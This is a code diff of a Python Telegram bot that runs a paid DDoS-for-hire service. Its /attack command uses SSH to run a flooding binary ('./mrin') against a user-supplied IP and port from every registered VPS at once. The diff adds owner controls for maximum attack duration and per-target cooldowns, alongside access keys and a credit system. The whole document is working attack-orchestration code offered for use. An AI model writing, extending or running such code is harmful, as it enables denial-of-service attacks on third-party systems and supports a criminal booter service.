@@ -22,14 +22,19 @@ KEYS_FILE = "keys.json"
 USERS_FILE = "users.json"
 BLOCKED_USERS_FILE = "blocked_users.json"
 LOGS_FILE = "execution_logs.txt"
-ADMIN_CREDITS_FILE = "admin_credits.json"
+ADMIN_CREDITS_FILE = "admin_credits.json"  # For advanced credit system
 
 # Global variables for execution cancellation and logging
 running_channels = {}  # Maps thread name to its SSH channel
 cancel_event = threading.Event()
 log_lock = threading.Lock()
 
-# ThreadPoolExecutor for handling parallel tasks
+# Global attack settings and cooldown dictionary
+global_max_duration = 60         # default maximum attack duration (seconds)
+global_cooldown = 300            # default cooldown period (seconds) after an attack
+attack_cooldowns = {}            # mapping: target_ip -> cooldown expiry datetime
+
+# ThreadPoolExecutor for parallel tasks
 executor = ThreadPoolExecutor(max_workers=10)
 
 # ---------------------------
@@ -163,7 +168,7 @@ def get_credit_history(admin_id):
 # ---------------------------
 def execute_command(vps, target_ip, target_port, duration):
     try:
-        # Use nohup to run the remote command in background
+        # Run remote command with nohup so it runs in the background
         command = f'nohup ./mrin {target_ip} {target_port} {duration} 900 > /dev/null 2>&1 &'
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -266,7 +271,8 @@ def send_welcome(message):
         "• /addvps, /listvps, /removevps, /updatevps, /status 🖥️\n"
         "• /logs, /revoke, /listkeys, /keyinfo 📜\n"
         "• /blockuser, /unblockuser, /cancel 🛑\n"
-        "• /admin, /checkcredits, /addcredit 💳"
+        "• /admin, /checkcredits, /addcredit 💳\n"
+        "• /setduration, /setcooldown (Owner only)"
     )
     safe_reply(message, welcome_text)
 
@@ -345,6 +351,50 @@ def use_key_handler(message):
     save_users_data()
     safe_reply(message, f"<b>✅ Key accepted!</b> You can attack for {key_data['max_duration']} seconds.")
 
+# ---------------------------
+# New Owner-only Commands: /setduration and /setcooldown
+# ---------------------------
+@bot.message_handler(commands=['setduration'])
+@safe_handler
+def set_duration_handler(message):
+    if message.from_user.id != BOT_OWNER_ID:
+        safe_reply(message, "<b>🚫 Not authorized to set max duration!</b>")
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        safe_reply(message, "<b>❓ Usage:</b> /setduration &lt;seconds&gt;")
+        return
+    try:
+        duration = int(parts[1])
+    except ValueError:
+        safe_reply(message, "<b>❌ Duration must be an integer.</b>")
+        return
+    global global_max_duration
+    global_max_duration = duration
+    safe_reply(message, f"<b>✅ Global max attack duration set to:</b> {duration} seconds")
+
+@bot.message_handler(commands=['setcooldown'])
+@safe_handler
+def set_cooldown_handler(message):
+    if message.from_user.id != BOT_OWNER_ID:
+        safe_reply(message, "<b>🚫 Not authorized to set cooldown!</b>")
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        safe_reply(message, "<b>❓ Usage:</b> /setcooldown &lt;seconds&gt;")
+        return
+    try:
+        cooldown = int(parts[1])
+    except ValueError:
+        safe_reply(message, "<b>❌ Cooldown must be an integer.</b>")
+        return
+    global global_cooldown
+    global_cooldown = cooldown
+    safe_reply(message, f"<b>✅ Global cooldown set to:</b> {cooldown} seconds")
+
+# ---------------------------
+# Modified /attack Command with Global Duration and Cooldown Checks
+# ---------------------------
 @bot.message_handler(commands=['attack'])
 @safe_handler
 def attack_vps(message):
@@ -372,18 +422,32 @@ def attack_vps(message):
     except ValueError:
         safe_reply(message, "<b>❌ Duration must be an integer.</b>")
         return
+    # Check against global max duration
+    if duration > global_max_duration:
+        safe_reply(message, f"<b>⚠️ Duration exceeds global max duration of {global_max_duration} seconds.</b>")
+        return
+    # Check if target IP is on cooldown
+    now = datetime.now()
+    if ip in attack_cooldowns and now < attack_cooldowns[ip]:
+        safe_reply(message, f"<b>🚫 This IP is on cooldown until {attack_cooldowns[ip].strftime('%Y-%m-%d %H:%M:%S')}.</b>")
+        return
     if duration > key_data["max_duration"]:
-        safe_reply(message, f"<b>⚠️ Duration exceeds max {key_data['max_duration']} seconds.</b>")
+        safe_reply(message, f"<b>⚠️ Duration exceeds your key's max duration of {key_data['max_duration']} seconds.</b>")
         return
     if not vps_servers:
         safe_reply(message, "<b>❌ No VPS available for the attack!</b>")
         return
     cancel_event.clear()
     safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
+    # Set cooldown for this IP
+    attack_cooldowns[ip] = now + timedelta(seconds=global_cooldown)
     for vps in vps_servers:
         thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
         thread.start()
 
+# ---------------------------
+# VPS Management Commands
+# ---------------------------
 @bot.message_handler(commands=['addvps'])
 @safe_handler
 def add_vps_handler(message):
@@ -495,6 +559,9 @@ def show_logs_handler(message):
     else:
         safe_reply(message, "<b>ℹ️ No logs available.</b>")
 
+# ---------------------------
+# Key Management Commands
+# ---------------------------
 @bot.message_handler(commands=['revoke'])
 @safe_handler
 def revoke_key_handler(message):
@@ -547,6 +614,9 @@ def key_info_handler(message):
                  f"<b>Users registered:</b> {len(details['used'])}")
     safe_reply(message, info_text)
 
+# ---------------------------
+# User Blocking Commands
+# ---------------------------
 @bot.message_handler(commands=['blockuser'])
 @safe_handler
 def block_user_handler(message):
@@ -591,6 +661,9 @@ def unblock_user_handler(message):
     else:
         safe_reply(message, "<b>ℹ️ User is not blocked.</b>")
 
+# ---------------------------
+# Cancel Execution Command
+# ---------------------------
 @bot.message_handler(commands=['cancel'])
 @safe_handler
 def cancel_execution_handler(message):
@@ -608,7 +681,7 @@ def cancel_execution_handler(message):
     cancel_event.clear()
 
 # ---------------------------
-# Admin Panel for Credit Management
+# Admin Panel & Key Management (Owner-only)
 # ---------------------------
 @bot.message_handler(commands=['admin'])
 @safe_handler
@@ -621,11 +694,10 @@ def admin_panel_handler(message):
     button_genkey = telebot.types.InlineKeyboardButton(text="✨ Generate Key", callback_data="admin_genkey")
     button_listkeys = telebot.types.InlineKeyboardButton(text="📜 List Keys", callback_data="admin_listkeys")
     button_revoke = telebot.types.InlineKeyboardButton(text="❌ Revoke Key", callback_data="admin_revoke")
-    keyboard.row(button_genkey)
-    keyboard.row(button_listkeys, button_revoke)
+    keyboard.row(button_genkey, button_listkeys)
+    keyboard.row(button_revoke)
     admin_text = "<b>🛠️ Admin Panel</b>\nSelect an action:"
-    safe_reply(message, admin_text)
-    safe_send(message.chat.id, "", reply_markup=keyboard)
+    safe_send(message.chat.id, admin_text, reply_markup=keyboard)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
 @safe_handler
@@ -757,6 +829,9 @@ def add_credit_command(message):
     add_credit(target_id, amount, reason="Manual credit addition")
     safe_reply(message, f"<b>✅ Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}")
 
+# ---------------------------
+# Echo Command (for testing)
+# ---------------------------
 @bot.message_handler(func=lambda message: True)
 @safe_handler
 def echo_all(message):
